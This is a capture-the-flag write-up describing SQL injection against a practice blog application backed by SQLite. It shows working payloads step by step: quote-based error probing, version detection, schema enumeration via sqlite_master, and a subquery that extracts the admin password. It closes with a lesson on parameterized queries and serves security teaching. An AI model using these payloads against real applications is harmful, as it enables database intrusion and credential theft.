
# Challenge Objective

**Goal:** Retrieve the **admin password (or flag)** from a vulnerable web application by exploiting a **SQL injection vulnerability**.

The challenge involves a blog-like website with a registration form. By interacting with the site and testing inputs, you can discover a SQL Injection vulnerability that allows extracting sensitive information from the database.

---

### 1️⃣ Initial Observation

> **“Enter the website provided in the challenge and you'll be redirected to a blogpost-like webpage.”**

* You visit the provided URL and land on a typical blog site.
* You're asked to **register** a **username** and **password**, which suggests that the backend stores user credentials.
  
![Share Ideas Online - Google Chrome 5_7_2025 11_37_33 PM](https://github.com/user-attachments/assets/296318b2-aa37-4ea8-b065-c6402b470bab)

---

### 2️⃣ Register a Dummy Account

> **“Register a username and password.”**

* Create an account (e.g., `user: test`, `password: 1234`) to observe how the login or user interface behaves.
* You will likely be redirected to a personalized area where user posts or blog entries are displayed.

![Share Ideas Online - Google Chrome 5_7_2025 11_37_42 PM](https://github.com/user-attachments/assets/cc7b69ee-c11d-4382-8b38-2da01fba0804)

![Share Ideas Online - Google Chrome 5_7_2025 11_38_10 PM](https://github.com/user-attachments/assets/822d5855-e74b-4110-add0-0a148f8bb8da)

---

### 3️⃣ Check for SQL Injection Possibility

> **“Check if SQL injection is possible by typing a `'` or a `-` followed by something.”**

* Go back to the login or input form (most likely in a search or post interaction field).
* Try inserting suspicious input like:

  ```plaintext
  '
  ```

  or:

  ```plaintext
  a ' || 1 = '1'
  ```
  
![Share Ideas Online - Google Chrome 5_7_2025 11_39_43 PM](https://github.com/user-attachments/assets/960f77e5-d6db-4d9a-a300-c85bb121a569)
  
* You notice a **visible SQL error** (top-left of the page or somewhere in the response), confirming that the backend is not properly escaping input.

![Share Ideas Online - Google Chrome 5_7_2025 11_39_57 PM](https://github.com/user-attachments/assets/ecb76a9e-a66b-410e-85c8-4cad52f24c92)

> This reveals that **SQL Injection** is possible.

---

### 4️⃣ Identify the SQL Engine

> **“Try finding the SQL version used in the webpage by using: `version' || (select sqlite_version()));--`”**

 ![Share Ideas Online - Google Chrome 5_7_2025 11_41_21 PM](https://github.com/user-attachments/assets/fa07d64a-687d-458b-9cdb-a038f24c44d0)

* You craft an SQL injection payload using SQLite syntax:

  ```sql
  ' || (SELECT sqlite_version()));--
  ```

* What this does:

  * `'` closes the string.
  * `||` is SQLite's string concatenation operator.
  * `(SELECT sqlite_version())` fetches the database version.
  * `--` comments out the rest of the query.
 
    ![Share Ideas Online - Google Chrome 5_7_2025 11_41_27 PM](https://github.com/user-attachments/assets/1367150b-91de-460f-89f6-a02e056b2a95)


> This shows that the backend database is **SQLite**, not MySQL or PostgreSQL, which affects syntax.

---

### 5️⃣ List Tables from SQLite

> **“We need to find the tables used so we type: `DB' || (SELECT sql FROM sqlite_master));--`”**

* SQLite stores its **schema** in a special table called `sqlite_master`.

* To see table definitions, use:

  ```sql
  SELECT sql FROM sqlite_master;
  ```

* Injected into the input as:

  ```plaintext
  ' || (SELECT sql FROM sqlite_master));--
  ```
  
![Share Ideas Online - Google Chrome 5_7_2025 11_42_27 PM](https://github.com/user-attachments/assets/8efee97d-f4b3-482a-afc1-1d84e3340b59)

* The output will show table creation queries like:

  ```sql
  CREATE TABLE xde43_users (id INTEGER, username TEXT, password TEXT, role TEXT)
  ```
  
![Share Ideas Online - Google Chrome 5_7_2025 11_42_35 PM](https://github.com/user-attachments/assets/301349af-a002-4f15-a771-dac3f318754e)

## Now we know:

* Table name: `xde43_users`
* Relevant columns: `username`, `password`, `role`

---

### 6️⃣ Extract the Admin Password

> **“Create a query that searches for all passwords with users that have the admin role.”**

* You now want to extract the `password` of users where the `role = "admin"`:

  ```sql
  SELECT password FROM xde43_users WHERE role = "admin";
  ```

* SQL Injection payload becomes:

  ```plaintext
  ' || (SELECT password FROM xde43_users WHERE role="admin"));--
  ```
  
![Share Ideas Online - Google Chrome 5_7_2025 11_43_56 PM](https://github.com/user-attachments/assets/84103ec9-879b-4420-b96c-8d576138c3a1)

* What it does:

  * Injects a subquery that fetches the admin password.
  * `||` concatenates the result with the output.
  * The rest of the query is commented out using `--`.

 Once submitted, the **response page updates** and shows a **new post or message** containing the **admin password or flag**, such as:

```
flag245698
```

![Share Ideas Online - Google Chrome 5_7_2025 11_44_00 PM](https://github.com/user-attachments/assets/9ffec2aa-9aee-4bce-849f-607409aa3610)

---

## 🔐 Summary of Exploitation Flow

| Step | Action                                                    | Goal                            |
| ---- | --------------------------------------------------------- | ------------------------------- |
| 1    | Register account                                          | Access input vectors            |
| 2    | Inject `'` or `--`                                        | Confirm SQLi exists             |
| 3    | Use `SELECT sqlite_version()`                             | Detect SQLite backend           |
| 4    | Use `SELECT sql FROM sqlite_master`                       | Discover table and column names |
| 5    | Use `SELECT password FROM xde43_users WHERE role="admin"` | Extract the flag                |

---

## 🛠 SQL Injection Techniques Used

* **Error-based SQLi**: Initial `'` causes visible error output.
* **SQLite-specific syntax**:

  * `||` for string concatenation.
  * `sqlite_master` to enumerate schema.
* **Inline subquery extraction** to pull sensitive data into the response.

---

## ⚠️ Security Lesson

This challenge demonstrates **why input sanitization is critical**. The backend should:

* Use **parameterized queries**.
* Never interpolate user input into SQL strings.
* Sanitize output to avoid leaking errors.

---

